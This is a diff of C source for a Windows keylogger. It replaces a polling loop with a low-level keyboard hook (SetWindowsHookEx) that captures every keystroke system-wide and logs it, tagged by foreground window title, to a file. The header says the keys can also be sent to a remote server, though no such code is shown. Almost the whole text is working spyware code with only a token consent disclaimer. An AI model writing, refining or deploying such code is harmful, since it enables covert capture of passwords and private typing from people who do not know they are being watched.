@@ -2,156 +2,144 @@
  * Keylogger Created by Qwerty
  * Works only on Windows
  * 
- * This program captures every keystroke typed on the system.
- * It records the pressed keys and can save them to a log file
+ * This program captures every keystroke typed on the system by hooking into low-level keyboard events.
+ * It records the pressed keys and can save them to a log file or transmit them to a remote server.
+ * This works by using Windows API functions like SetWindowsHookEx to intercept keyboard input events.
  * 
  * Use responsibly and with consent. Unauthorized use is illegal.
+ * 
+ * Problems
+ * -> Can't get special chars
  **/
 
 #include <stdio.h>
-#include <windows.h>
+#include <strings.h>
 
-#define BUFFER_SIZE 1024 // size of the buffer array
-#define PROCESS_SIZE 256 // size of the process buffer array
-#define THREADS 2 // Number of threads
-#define DELAY 70 // delay to not overwhelme the cpu
+// VirtalKeyToChar.h has windows.h
+#include "src/VirtualKeyToChar.h"
 
-char* buffer = NULL;
-int buffer_index = 0;
-int size_b = BUFFER_SIZE;
+#pragma GCC optimize("O3") // Global High Level Optimization
 
-//func to listen to the keystrokes
-DWORD WINAPI listener(LPVOID lparam) {   
-	int keyState[PROCESS_SIZE] = { 0 }; // Keep track of key press
-	int special_keys[] = {0x7e, 0x60, 0x21, 0x40, 0x23, 0x24, 0x25, 0x5e,
- 						0x26, 0x2a, 0x28, 0x29, 0x5f, 0x2d, 0x2b, 0x3d,
- 		    			0x7b, 0x5b, 0x7d, 0x5d, 0x7c, 0x5c, 0x27, 0x22,
- 						0x3b, 0x3a, 0x3c, 0x2c, 0x3e, 0x2e, 0x3f, 0x2f ,
-						0x0D, 0x09, 0x20};
-	int size = sizeof(special_keys)/sizeof(*special_keys);
+#define BUFFER_SIZE 2049
+#define PROCESS_SIZE 256
+#define DELAY 1000  // 1 sec
+#define THREADS 2
+#define LOG_FILE "Keylogger.log"
 
-    while (1) {
-		// Checks if buffer needs to be reallocated
-		if (buffer_index >= size_b - 1) {
-			size_b *= 2;
-			buffer = (char* )realloc(buffer, sizeof(char) * size_b);
-			if (!buffer) {
-				exit(1); // Exit gracefully
-			}
-		}
+char *buffer = NULL;
+int buffer_ptr = 0;
+CRITICAL_SECTION cs;
 
-        // Check for Uppercase alphabetic keys (A-Z)
-        for (int vKey = 0x41; vKey <= 0x5A ; vKey++) {
-			// Key is pressed
-            if ((GetAsyncKeyState(vKey) & 0x8000) && (keyState[vKey] == 0)) {
-                buffer[buffer_index++] = (char) vKey;
-				keyState[vKey] = 1;
+LRESULT CALLBACK KeyboardProc(int ncode, WPARAM wparam, LPARAM lparam) {
+    if (ncode >= 0 ) {
+        if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN) {
+            
+            KBDLLHOOKSTRUCT* pKeyboard = (KBDLLHOOKSTRUCT* ) lparam;
+            // Backspace Logic
+            if ((pKeyboard->vkCode == VK_BACK) && (buffer_ptr > 0)) {
+                --buffer_ptr; 
+                return CallNextHookEx(NULL, ncode, wparam, lparam);
             }
-			// Key was pressed
-			if ((GetAsyncKeyState(vKey) & 0x8000) == 0 && (keyState[vKey] == 1)) {
-				keyState[vKey] = 0;
-			}
-        }
 
-		// Check for Lowercase alphabetic keys (a-z)
-        for (int vKey = 0x61; vKey <= 0x7A ; vKey++) {
-			// Key is pressed
-            if ((GetAsyncKeyState(vKey) & 0x8000) && (keyState[vKey] == 0)) {
-                buffer[buffer_index++] = (char) vKey;
-				keyState[vKey] = 1;
+            char vKey = VirtualKeyToChar(pKeyboard->vkCode);
+            
+            if (vKey) {
+                EnterCriticalSection(&cs);
+                *(buffer + buffer_ptr) = vKey; 
+                buffer_ptr++;
+                *(buffer + buffer_ptr) = '\0';
+                LeaveCriticalSection(&cs);
             }
-			// Key was pressed
-			if ((GetAsyncKeyState(vKey) & 0x8000) == 0 && (keyState[vKey] == 1)) {
-				keyState[vKey] = 0;
-			}
-        }
-
-        // Check for number keys (0-9)
-        for (int vKey = 0x30; vKey <= 0x39; vKey++) {
-			// Key is pressed
-            if ((GetAsyncKeyState(vKey) & 0x8000) && (keyState[vKey] == 0)) {
-                buffer[buffer_index++] = (char) vKey;
-				keyState[vKey] = 1;
-            }
-			// Key was pressed
-			if ((GetAsyncKeyState(vKey) & 0x8000) == 0 && (keyState[vKey] == 1)) {
-				keyState[vKey] = 0;
-			}
-        }
-
-        // Special keys 
-        for (int vKey = 0; vKey < size; vKey++) {
-			// key is pressed
-			if ((GetAsyncKeyState(*(special_keys + vKey)) & 0x8000) && (keyState[*(special_keys + vKey)] == 0)) {
-				buffer[buffer_index++] = (char) *(special_keys + vKey);
-				keyState[*(special_keys + vKey)] = 1;
-			}
-			// Key was pressed
-			if ((GetAsyncKeyState(*(special_keys + vKey)) & 0x8000) == 0 && (keyState[*(special_keys + vKey)] == 1)) {
-				keyState[*(special_keys + vKey)] = 0;
-			}
-		}
-
-		// Backspace ...
-        if (GetAsyncKeyState(0x08) & 0x8000) {
-            if (buffer_index > 0) {
-                --buffer_index; // overwrites
-            }
-        }
-        
-        Sleep(DELAY); // slight delay not to overwhelm the cpu
+        }        
     }
-	return 0;
+    return CallNextHookEx(NULL, ncode, wparam, lparam); // pass it to next hook
+}
+
+DWORD WINAPI ListenerProc() {
+    HHOOK keyboardhook = SetWindowsHookExW(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
+    if (!keyboardhook) {
+        return 1;
+    }
+
+
+    MSG msg;
+    while (GetMessage(&msg, NULL, 0, 0) != 0) {
+        TranslateMessage(&msg);
+        DispatchMessage(&msg);
+    }
+
+    UnhookWindowsHookEx(keyboardhook);
+
+    return 0;
 }
 
 HWND get_window() {
-	return GetForegroundWindow();
+    return GetForegroundWindow();
 }
 
-// func to write into a file
-DWORD WINAPI writer(LPVOID lparam) {
-	char forground_process[PROCESS_SIZE], background_process[PROCESS_SIZE] = {0};
-	FILE* file = fopen("Keylogger.log", "a");
-	if (!file) {
-		exit(1); // file opening failed!
-	}
+void Get_time(FILE* file) {
+    SYSTEMTIME st;
+    GetLocalTime(&st);
+    fprintf(file,"*************************************\n");
+    fprintf(file, "Started on %d/%d/%d at %d:%d:%d\n", st.wDay, st.wMonth, st.wYear, st.wHour, st.wMinute, st.wSecond);
+    return;
+}
 
-	while (1) {
-		HWND hwnd = get_window();
-		if (!hwnd) {
-			continue;
-		}
-		GetWindowText(hwnd, forground_process, PROCESS_SIZE);
-		if (strcmp(background_process, forground_process)) {	
-			// Write to the file
-			fprintf(file, "[%s] : %s\n", forground_process, buffer);
-			fflush(file);
-			buffer_index = 0;
-			*buffer = '\0'; // clear buffer
-			strcpy(background_process, forground_process);
-		}
-		Sleep(1000); // Sleeps every 1 sec
-	}
+DWORD WINAPI WriterProc() {
+    char forgroundproc[PROCESS_SIZE], blacklist[] = "Task Switching", backgroundproc[PROCESS_SIZE] = { 0 };
+    FILE* file = fopen(LOG_FILE, "a");
+    if (!file) {
+        return 1;
+    }
 
-	fclose(file);
-	return 0;
+    Get_time(file); // Writes the starting time into the file
+
+    while (TRUE) {
+        HWND hwnd = get_window();
+        if (!hwnd) {
+            continue;
+        }
+        GetWindowText(hwnd, forgroundproc, PROCESS_SIZE);
+
+        // Writes only when the process is not same 
+        if (buffer_ptr) { 
+            if (strcmp(backgroundproc, forgroundproc) && strcmp(forgroundproc,blacklist)) { 
+
+                EnterCriticalSection(&cs);
+                // Write to the file 
+                printf("[ %s ] : %s\n", backgroundproc, buffer);
+                fflush(stdout);
+                fprintf(file, "[ %s ] : %s\n", backgroundproc, buffer);
+                fflush(file);
+                buffer_ptr = 0; // Reset buffer pointer
+                *buffer = '\0'; // Clear buffer
+                strcpy(backgroundproc, forgroundproc);
+                
+                LeaveCriticalSection(&cs);
+            }
+        }
+        Sleep(DELAY);
+    }
+
+    fclose(file);
+    return 0;
 }
 
 int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
-	buffer = (char*) malloc(BUFFER_SIZE * sizeof(char));
+    buffer = (char* ) malloc(BUFFER_SIZE * sizeof(char));
     HANDLE* threads = (HANDLE* ) malloc(THREADS * sizeof(HANDLE));
-	
-	if (!threads || !buffer) {
-		return 1;
-	}
 
-	*threads = CreateThread(NULL, 0, &listener, NULL, 0, 0);
-	*(threads + 1) = CreateThread(NULL, 0, &writer, NULL, 0, 0);
+    if (!buffer || !threads) {
+        return 1;
+    }
+    
+    InitializeCriticalSection(&cs);
+    *threads = CreateThread(NULL, 0, &ListenerProc, NULL, 0, 0);
+    *(threads + 1) = CreateThread(NULL, 0, &WriterProc, NULL, 0, 0);
 
-    WaitForMultipleObjects(THREADS, threads, TRUE, INFINITE); // Waiting for threads to complete
-	
-	//Cleaning
+    WaitForMultipleObjects(THREADS, threads, 1, INFINITE);
     free(threads);
-	free(buffer);
+    free(buffer);
+    DeleteCriticalSection(&cs);
     return 0;
 }
